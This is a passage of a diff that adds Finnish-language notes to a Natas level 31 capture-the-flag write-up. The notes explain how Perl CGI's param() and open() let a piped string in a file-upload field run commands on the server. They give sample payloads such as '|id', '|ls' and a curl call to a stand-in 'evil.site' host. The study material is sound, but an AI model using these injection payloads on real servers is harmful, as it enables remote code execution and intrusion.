@@ -26,6 +26,50 @@ Nyt tässä upotin jonkun excel taulukon ja just etusivun mukaan piti/pitää ol
 
 ![alt text](./kuvat-level29-34/natas31-5.png)
 
+view-sourcce koodissa on kirjoitettu koskien tiedoston upottamista ja muita tiedostontyyppiä, niin upotettun jälkeen se tulosta jotakin formaatti taulukkoa ja just esim. tämä csv excel taulukko.
+
+## pieni teoria
+
+view-source html koodissa on tällinen skripti funktio if-else osuus ja while osuus kunnes täsmentyy niin saadaan se salasana.
+
+Jossakin ohjeesa tai testeissä - esim. muiden sivustojen mukaan testannut .csv eli excel taulukon injektio hyökkäystä.
+
+```
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+        my @elements=split /,/, $_;
+```
+
+
+- `param('file')` palauttaa lomakeparametrin sisällön:
+  - Jos oikea tiedosto on lähetetty, `$file` on tiedostokahva → toimii oikein `while (<$file>)`.
+  - Jos file-parametri on vain teksti, `$file` on pelkkä merkkijono → `while (<$file>)` ei toimi odotetusti.
+
+
+- param() on kontekstiriippuvainen → voi palauttaa eri tyyppistä dataa.
+- Tämä haavoittuvuus tunnetaan esim. nimellä "Perl file upload RCE".
+
+
+
+🔒 Perl CGI:n tiedostonkäsittelyn haavoittuvuus – tiivis kuvaus::
+
+- Perlissä `CGI->param('file')` voi palauttaa joko **tiedostokahvan** (kun oikea tiedosto on lähetetty) tai **pelkän merkkijonon** (esimerkiksi manipuloidusta lomakkeesta). Tämä johtuu siitä, että `param()` on **kontekstiriippuvainen** funktio.
+
+- Jos saadun muuttujan sisältö (esim. `$file`) on **merkkijono**, eikä **tiedostokahva**, mutta sitä silti käytetään `while (<$file>)` tai `open($file)` -rakenteessa, koodi **ei toimi odotetusti** ja saattaa käyttäytyä **vaarallisesti**.
+
+- Perlissä `open()`-funktio tulkitsee merkkijonot, jotka alkavat tai loppuvat **putkimerkillä** (`|`), **suoritettaviksi komennoiksi**. Tällöin käyttäjän syöte voi johtaa **komennon suorittamiseen palvelimella** (**RCE = Remote Code Execution**).
+
+- Hyökkääjä voi huijata järjestelmää lähettämällä `file`-parametrin arvoksi merkkijonon kuten `"|id"` tai `"|curl http://evil.site|"`, jolloin CGI-skripti saattaa suorittaa tämän **komentona**.
+
+- Tämän vuoksi on **äärimmäisen tärkeää tarkistaa**, että `$file` on oikeasti **tiedostokahva** eikä pelkkä **merkkijono** ennen kuin sitä käytetään lukemiseen tai `open()`-kutsussa.
+
+
+**Lyhyesti sanottuna**: tässä tasossa käytetään CGI-pohjaista Perl-skriptiä, joka vastaanottaa HTML-lomakkeella lähetettyjä tiedostoja. Tämä toimii vähän kuin HTML5:n ja PHP:n tiedostojen lähetys, eli lomake lähettää `file`-nimisen kentän palvelimelle. Taustalla käytetty CGI-moduuli käsittelee tämän kentän, mutta siinä on haavoittuvuus: jos käyttäjä huijaa ja lähettää tiedoston nimen sijaan komennon (esim. `|ls`), voi tämä syöte päätyä suoraan Perl-koodiin ja suorittaa komentorivikäskyjä. Kyseessä on siis tiedostonlähetykseen liittyvä injektiohyökkäys (RCE).
+
 
 ## kali linux testausta - START HERE;
 
